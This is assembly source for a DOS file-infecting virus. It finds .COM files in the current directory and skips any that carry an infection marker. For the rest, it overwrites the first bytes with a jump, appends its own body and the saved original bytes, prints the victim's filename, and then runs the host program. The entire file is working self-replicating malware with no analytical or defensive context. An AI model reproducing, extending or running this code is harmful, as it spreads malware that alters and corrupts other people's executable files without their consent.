.model tiny
.code
org 100h
start:

hardcode:

    mov bp, 0

code:

    ; reverting first bytes
    push bx
    mov bx, 100h
    mov al, [bp + offset leading_bytes[0]]
    mov ah, [bp + offset leading_bytes[1]]
    mov word ptr[bx], ax
    mov bx, 102h
    mov al, [bp + offset leading_bytes[2]]
    mov ah, [bp + offset leading_bytes[3]]
    mov word ptr[bx], ax
    pop bx

    ; setting dta on file
    mov ah, 1ah
    lea dx, [bp + file]
    int 21h

    ; finding victim file
    lea dx, [bp + file_mask]
    mov ah, 4eh
    int 21h

file_open:

    ; opening file (file descriptor -> ax)
    lea dx, [bp + file.fname]
    mov ax, 3D02h
    int 21h
    mov bx, ax ; file descriptor (ax) -> bx
    jnc file_err_skip

file_err:

    ; file error handling
    lea dx, [bp + file_err_msg]
    mov ah, 09h
    int 21h
    
    mov ax, 100h
    jmp ax

file_err_skip:

    ; mov ax, file.ftime

    ; moving carret to the end to get the payload offset
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h
    mov [bp + payload_offset], ax
    mov [bp + jmp_length], ax
    ; add ax, 100h
    add ax, 1
    mov [bp + victim_bp], ax
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; reading first 4 bytes
    mov cx, 4
    lea dx, [bp + leading_bytes]
    mov ah, 3fh
    int 21h

    ; checking the infection flag
    cmp [bp + leading_bytes + 3], 0ffh
    jnz find_next_skip

find_next:

    ; finding next file
    mov ah, 3eh
    int 21h
    mov ah, 4fh
    int 21h
    jc file_err
    jmp file_open

find_next_skip:

    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; inserting load injection
    mov [bp + byte_buffer], 0e9h ; word-pointer jmp
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h

    mov ax, [bp + jmp_length] ; jmp offset
    sub ax, 3 ; jmp command size
    ; add ax, 100h ; com header
    mov [bp + word_buffer], ax
    lea dx, [bp + word_buffer]
    mov cx, 2
    mov ah, 40h
    int 21h

    mov [bp + byte_buffer], 0ffh
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h
    
    ; moving carret to the end
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h

    ; writing payload hardcode
    mov [bp + byte_buffer], 0bdh ; mov bp command
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h

    mov ax, [bp + victim_bp]
    mov [bp + word_buffer], ax
    lea dx, [bp + word_buffer]
    mov cx, 2
    mov ah, 40h
    int 21h

    mov [bp + byte_buffer], 08bh ; wtf
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h

    ; writing payload code
    lea dx, [bp + code]
    add dx, 1
    ; add dx, bp
    mov cx, offset harddata
    sub cx, offset code
    mov ah, 40h
    int 21h

    ; writing payload harddata
    lea dx, [bp + leading_bytes]
    mov cx, 4
    mov ah, 40h
    int 21h
    
    ; writing payload data
    mov dx, bp
    add dx, offset data
    lea cx, afterall
    sub cx, offset data
    mov ah, 40h
    int 21h

    ; closing file
    mov ah, 3eh
    int 21h

    ; PAYLOAD BEGIN

    ; output infected filename
    lea dx, [bp + file.fname]
    call str_f2c
    mov ah, 09h
    int 21h
    call str_c2f

    ; PAYLOAD END

    ; redirect to victim program
    mov ax, 100h
    jmp ax

procedures:

    str_f2c proc
        push cx
        push bx
        mov cx, 13
        str_f2c_lp:
        mov bx, bp
        add bx, dx
        add bx, 13
        sub bx, cx
        cmp byte ptr[bx], 0
        jz str_f2c_ch
        loop str_f2c_lp
        str_f2c_popret:
        pop bx
        pop cx
        ret
        str_f2c_ch:
        mov [bx], '$'
        jmp str_f2c_popret
    str_f2c endp

    str_c2f proc
        push cx
        push bx
        mov cx, 13
        str_c2f_lp:
        mov bx, bp
        add bx, dx
        add bx, 13
        sub bx, cx
        cmp byte ptr[bx], '$'
        jz str_c2f_ch
        loop str_c2f_lp
        str_c2f_popret:
        pop bx
        pop cx
        ret
        str_c2f_ch:
        mov [bx], 0
        jmp str_c2f_popret
    str_c2f endp

harddata:

    leading_bytes db 0b4h, 4ch, 0cdh, 21h

data:

    test1 dw 0abcdh
    
    ; 13-byte string for filename
    Str13 struc
    max db 13
    len db ?
    text db 13 dup(?)
    Str13 ends

    ; DTA buffer structure
    DTAFileInfo struc
    reserved db 21 dup(?)
    fattr db ?
    ftime dw ?
    fdate dw ?
    fsize dd ?
    fname db 13 dup(?)
    ends
    
    filename Str13 <>
    file DTAFileInfo <>

    dword_buffer dd ?
    word_buffer dw ?
    byte_buffer db ?
    
    payload_offset dw ?
    victim_bp dw ?
    jmp_length dw ?
    
    file_mask db '*.com*', 0
    file_err_msg db 'No any other files to infect', 13, 10, '$'

afterall:

end start